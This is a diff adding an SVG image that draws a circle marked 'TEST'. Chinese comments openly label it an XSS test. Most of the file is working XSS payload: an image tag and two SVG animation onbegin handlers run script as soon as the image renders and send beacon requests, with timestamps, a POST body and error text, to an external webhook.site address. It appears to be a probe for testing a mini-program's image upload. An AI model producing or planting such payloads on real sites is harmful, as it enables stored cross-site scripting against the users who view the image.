@@ -1,0 +1,15 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
+  <circle cx="50" cy="50" r="40" fill="#FF5722"/>
+  <text x="50" y="55" text-anchor="middle" fill="white" font-size="14">TEST</text>
+  
+  <!-- 最简单的XSS测试 -->
+  <image href="https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?simple_test=1" width="0" height="0"/>
+  
+  <!-- 使用SVG动画立即触发 -->
+  <animateTransform attributeName="transform" type="rotate" values="0;1" dur="0.1s" repeatCount="1" 
+    onbegin="(new Image()).src='https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?anim_trigger='+Date.now()"/>
+  
+  <!-- 使用set元素触发 -->
+  <set attributeName="opacity" to="1" begin="0s" 
+    onbegin="try{fetch('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829',{method:'POST',body:'miniprogram_simple_test'}).catch(()=>(new Image()).src='https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?fallback=1')}catch(e){(new Image()).src='https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?error='+e.message}"/>
+</svg>
